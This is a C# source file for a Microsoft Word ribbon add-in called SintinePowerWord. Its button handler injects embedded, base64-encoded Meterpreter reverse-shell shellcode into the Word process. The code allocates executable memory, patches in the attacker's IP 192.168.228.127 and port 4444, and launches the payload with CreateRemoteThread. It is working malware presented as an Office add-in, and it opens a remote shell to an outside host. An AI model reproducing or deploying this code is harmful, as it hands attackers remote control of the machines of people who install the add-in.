using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Office.Tools.Ribbon;

namespace SintinePowerWord
{
    public partial class SintinePowerRibbon
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
            Reserve = 0x00002000,
            Decommit = 0x00004000,
            Release = 0x00008000,
            Reset = 0x00080000,
            TopDown = 0x00100000,
            WriteWatch = 0x00200000,
            Physical = 0x00400000,
            LargePages = 0x20000000
        }
        [Flags]
        public enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags flgAccessFlag, bool inheritHandle, int processId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flgAllocationType, MemoryProtection flgProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr vAllocAddress, byte[] shellCodeBuffer, uint shellCodeLength, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr threadAttributes, uint stackSize, IntPtr vAlloc, IntPtr parameter, uint creationFlags, out uint threadId);
        private void SintinePowerRibbon_Load(object sender, RibbonUIEventArgs e)
        {


        }

        private void btnStartSintinePower_Click(object sender, RibbonControlEventArgs e)
        {
            Task.Factory.StartNew(() => RunMeterpreter("192.168.228.127", "4444"));
        }
        public static void RunMeterpreter(string ip, string port)
        {
            try
            {
                var ipOctetSplit = ip.Split('.');
                var octByte1 = Convert.ToByte(ipOctetSplit[0]);
                var octByte2 = Convert.ToByte(ipOctetSplit[1]);
                var octByte3 = Convert.ToByte(ipOctetSplit[2]);
                var octByte4 = Convert.ToByte(ipOctetSplit[3]);
                var inputPort = int.Parse(port);
                byte port1Byte = 0x00;
                byte port2Byte = 0x00;
                byte[] shellCodePacket = new byte[9];
                shellCodePacket[0] = 0x00;
                if (inputPort > 256)
                {
                    var portOct1 = inputPort / 256;
                    var portOct2 = portOct1 * 256;
                    var portOct3 = inputPort - portOct2;
                    var portoct1Calc = portOct1 * 256 + portOct3;
                    if (inputPort == portoct1Calc)
                    {
                        port1Byte = Convert.ToByte(portOct1);
                        port2Byte = Convert.ToByte(portOct3);
                        shellCodePacket[1] = port1Byte;
                        shellCodePacket[2] = port2Byte;
                    }
                }
                else
                {
                    shellCodePacket[1] = port1Byte;
                    shellCodePacket[2] = Convert.ToByte(inputPort);
                }

                shellCodePacket[3] = octByte1;
                shellCodePacket[4] = octByte2;
                shellCodePacket[5] = octByte3;
                shellCodePacket[6] = octByte4;
                shellCodePacket[7] = 0x41;
                shellCodePacket[8] = 0x54;
                const string shellCodeRaw = "/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSIty" +
                                            "UEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCL" +
                                            "QjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhE" +
                                            "i0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXx" +
                                            "TANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB" +
                                            "0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11J" +
                                            "vndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKjkf0FU" +
                                            "SYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5Q" +
                                            "UE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ" +
                                            "4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJN" +
                                            "MclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhI" +
                                            "ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnI" +
                                            "X//VSAHDSCnGSIX2deFB/+c=";
                var s3 = Convert.ToBase64String(shellCodePacket);
                var newShellCode = shellCodeRaw.Replace("ABFcwKjkf0FU", s3);
                byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);
                var currentProcess = Process.GetCurrentProcess();
                var processId = currentProcess.Id;
                IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, processId);
                IntPtr vAlloc = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellCodeBase64.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                UIntPtr bytesWritten = UIntPtr.Zero;
                WriteProcessMemory(procHandle, vAlloc, shellCodeBase64, (uint) shellCodeBase64.Length, out bytesWritten);
                uint threadId = 0;
                IntPtr remThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, vAlloc, IntPtr.Zero, 0, out threadId);
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
        
    }
}
